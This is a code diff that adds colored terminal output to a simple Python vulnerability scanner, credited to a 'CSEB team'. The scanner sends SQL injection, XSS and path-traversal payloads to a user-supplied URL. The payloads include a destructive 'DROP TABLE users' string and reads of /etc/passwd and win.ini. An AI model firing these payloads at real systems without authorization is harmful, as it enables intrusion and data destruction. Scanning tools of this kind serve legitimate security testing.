@@ -1,9 +1,10 @@
 import requests
 import sys
 import time
+from termcolor import colored
 
 # ASCII Art Logo
-logo = """
+logo = colored("""
  ███╗   ██╗███████╗████████╗██╗    ██╗██╗███████╗███████╗
  ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██║██╔════╝██╔════╝
  ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║███████╗███████╗
@@ -18,27 +19,29 @@ logo = """
     [3] LFI Scanner
     [4] CSRF Scanner
 --------------------------------------------------------
-"""
+    Created by CSEB team
+--------------------------------------------------------
+""", 'yellow')
 
 # Menu Options
 def menu():
     print(logo)
-    choice = input("  [+] Select an option: ")
+    choice = input(colored("  [+] Select an option: ", 'cyan'))
     
     if choice == "1":
-        url = input("  [+] Enter target URL (with parameter): ")
+        url = input(colored("  [+] Enter target URL (with parameter): ", 'cyan'))
         sql_injection_scan(url)
     elif choice == "2":
-        url = input("  [+] Enter target URL: ")
+        url = input(colored("  [+] Enter target URL: ", 'cyan'))
         xss_scan(url)
     elif choice == "3":
-        url = input("  [+] Enter target URL (with file parameter): ")
+        url = input(colored("  [+] Enter target URL (with file parameter): ", 'cyan'))
         lfi_scan(url)
     elif choice == "4":
-        url = input("  [+] Enter target form URL: ")
+        url = input(colored("  [+] Enter target form URL: ", 'cyan'))
         csrf_scan(url)
     else:
-        print("\n  [-] Invalid option! Try again.\n")
+        print(colored("\n  [-] Invalid option! Try again.\n", 'red'))
         time.sleep(1)
         menu()
 
@@ -46,59 +49,59 @@ def menu():
 def sql_injection_scan(url):
     payloads = ["'", "' OR '1'='1", "' OR '1'='1' -- ", "'; DROP TABLE users; --"]
     
-    print("\n  [*] Testing for SQL Injection...\n")
+    print(colored("\n  [*] Testing for SQL Injection...\n", 'green'))
     
     for payload in payloads:
         test_url = f"{url}{payload}"
         response = requests.get(test_url)
 
         if "SQL syntax" in response.text or "mysql_fetch" in response.text:
-            print(f"  [+] SQL Injection Vulnerability Found: {test_url}")
+            print(colored(f"  [+] SQL Injection Vulnerability Found: {test_url}", 'red'))
             return
     
-    print("  [-] No SQL Injection vulnerability found.\n")
+    print(colored("  [-] No SQL Injection vulnerability found.\n", 'green'))
 
 # XSS Scanner
 def xss_scan(url):
     payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
 
-    print("\n  [*] Testing for XSS...\n")
+    print(colored("\n  [*] Testing for XSS...\n", 'green'))
     
     for payload in payloads:
         test_url = f"{url}{payload}"
         response = requests.get(test_url)
 
         if payload in response.text:
-            print(f"  [+] XSS Vulnerability Found: {test_url}")
+            print(colored(f"  [+] XSS Vulnerability Found: {test_url}", 'red'))
             return
     
-    print("  [-] No XSS vulnerability found.\n")
+    print(colored("  [-] No XSS vulnerability found.\n", 'green'))
 
 # LFI Scanner
 def lfi_scan(url):
     payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
 
-    print("\n  [*] Testing for Local File Inclusion...\n")
+    print(colored("\n  [*] Testing for Local File Inclusion...\n", 'green'))
 
     for payload in payloads:
         test_url = f"{url}{payload}"
         response = requests.get(test_url)
 
         if "root:x:" in response.text or "for 16-bit app support" in response.text:
-            print(f"  [+] LFI Vulnerability Found: {test_url}")
+            print(colored(f"  [+] LFI Vulnerability Found: {test_url}", 'red'))
             return
     
-    print("  [-] No LFI vulnerability found.\n")
+    print(colored("  [-] No LFI vulnerability found.\n", 'green'))
 
 # CSRF Scanner (Basic Test)
 def csrf_scan(url):
-    print("\n  [*] Checking for CSRF Vulnerability...\n")
+    print(colored("\n  [*] Checking for CSRF Vulnerability...\n", 'green'))
 
     response = requests.get(url)
     if "csrf" not in response.text.lower():
-        print(f"  [+] CSRF Vulnerability Detected (No CSRF Token Found) at: {url}")
+        print(colored(f"  [+] CSRF Vulnerability Detected (No CSRF Token Found) at: {url}", 'red'))
     else:
-        print("  [-] CSRF Protection Found.\n")
+        print(colored("  [-] CSRF Protection Found.\n", 'green'))
 
 # Run the Menu
 menu()
